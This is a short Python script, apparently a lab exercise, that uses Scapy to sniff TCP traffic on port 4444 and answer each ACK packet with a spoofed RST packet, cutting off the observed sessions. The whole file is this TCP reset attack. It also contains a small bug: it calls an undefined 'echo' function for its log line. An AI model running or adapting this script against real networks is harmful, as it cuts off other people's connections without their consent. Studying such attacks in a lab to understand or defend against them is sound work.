#! /usr/bin/env python3
#Inject forged TCP packets with RST flag to terminate sessions.
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send, sniff

# get the vicitm ip

#sniff or spoof first

def attack(pkt):
	if pkt.haslayer(TCP) and pkt[TCP].flags & 0x10:
		rst_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='R', seq=pkt[TCP].ack)
		send(rst_pkt)
		echo(f"[*] Sent forged RST to {pkt[IP].src}:{pkt[TCP].sport}")

sniff(filter="tcp port 4444", prn=attack)
